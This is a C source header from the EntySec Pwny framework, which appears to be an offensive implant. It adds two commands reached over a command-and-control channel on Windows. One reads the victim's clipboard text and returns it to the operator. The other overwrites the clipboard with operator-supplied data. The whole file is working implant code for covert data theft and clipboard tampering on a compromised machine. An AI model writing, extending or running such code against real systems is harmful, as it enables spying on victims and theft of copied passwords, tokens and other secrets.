/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _CLIPBOARD_H_
#define _CLIPBOARD_H_

#include <windows.h>
#include <string.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define CLIPBOARD_BASE 16

#define CLIPBOARD_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CLIPBOARD_BASE, \
                       API_CALL)
#define CLIPBOARD_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CLIPBOARD_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_CLIP_DATA TLV_TYPE_CUSTOM(TLV_TYPE_STRING, CLIPBOARD_BASE, API_TYPE)

static tlv_pkt_t *clipboard_get(c2_t *c2)
{
    tlv_pkt_t *result;

    if (!OpenClipboard(NULL))
    {
        log_debug("* Failed to open clipboard\n");
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL)
    {
        CloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    char *text = (char *)GlobalLock(hData);
    if (text == NULL)
    {
        CloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_CLIP_DATA, text);

    GlobalUnlock(hData);
    CloseClipboard();

    return result;
}

static tlv_pkt_t *clipboard_set(c2_t *c2)
{
    char data[65536];
    HGLOBAL hMem;
    char *pMem;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_CLIP_DATA, data) <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!OpenClipboard(NULL))
    {
        log_debug("* Failed to open clipboard\n");
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    EmptyClipboard();

    hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(data) + 1);
    if (hMem == NULL)
    {
        CloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pMem = (char *)GlobalLock(hMem);
    memcpy(pMem, data, strlen(data) + 1);
    GlobalUnlock(hMem);

    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

void register_clipboard_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, CLIPBOARD_GET, clipboard_get);
    api_call_register(api_calls, CLIPBOARD_SET, clipboard_set);
}

#endif
